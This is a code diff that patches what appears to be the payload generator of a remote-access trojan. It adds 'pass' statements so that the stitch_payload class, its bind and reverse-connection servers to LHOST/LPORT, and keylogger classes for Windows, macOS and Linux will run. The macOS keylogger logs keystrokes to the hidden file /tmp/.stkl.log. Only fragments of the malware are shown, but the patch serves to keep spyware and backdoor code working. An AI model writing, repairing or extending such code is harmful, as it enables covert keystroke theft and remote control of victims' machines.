@@ -22,6 +22,7 @@ main_imports = '''#!/usr/bin/env python
 from st_utils import *
 
 class stitch_payload():
+    pass
 
     connected = False
 '''
@@ -33,6 +34,7 @@ def add_bind_server(BHOST,BPORT):
         self.stop_bind_server = False
         # if no target is defined, we listen on all interfaces
         if dbg:
+            pass
     # print('creating server')
         server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -50,6 +52,7 @@ def add_bind_server(BHOST,BPORT):
                 client_socket.settimeout(None)
             except Exception:
                 if dbg:
+                    pass
     # print(e)
                 client_socket=None
                 pass
@@ -78,6 +81,7 @@ def add_listen_server(LHOST,LPORT):
                 sleep(5)
                 pass
             if dbg:
+                pass
     # print('trying to connect')
             client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -96,6 +100,7 @@ def add_listen_server(LHOST,LPORT):
                     client_socket.close()
             except Exception:
                 if dbg:
+                    pass
     # print(e)
                 client_socket.close()
 
@@ -121,6 +126,7 @@ def main():
             pass
         except Exception:
             if dbg:
+                pass
     # print(e)
             pass
         st_pyld.halt_bind_server()
@@ -144,6 +150,7 @@ def main():
             pass
         except Exception:
             if dbg:
+                pass
     # print(e)
             pass
         st_pyld.halt_listen_server()
@@ -166,6 +173,7 @@ def main():
             pass
         except Exception:
             if dbg:
+                pass
     # print(e)
             pass
         st_pyld.halt_bind_server()
@@ -414,6 +422,7 @@ def client_handler({2}):
         {2}.close()
     except Exception:
         if dbg:
+            pass
     # print(e)
         {2}.close()
 
@@ -585,6 +594,7 @@ from ctypes import *
 import win32clipboard
 
 class keylogger():
+    pass
 
     def __init__(self):
         self.kl_status = False
@@ -773,6 +783,7 @@ from Cocoa import NSEvent, NSKeyDownMask
 from PyObjCTools import AppHelper
 
 class keylogger():
+    pass
 
     def __init__(self):
         self.log_file = '/tmp/.stkl.log'
@@ -862,6 +873,7 @@ import datetime
 import threading
 
 class keylogger():
+    pass
 
     def __init__(self):
         self.kl_status = False
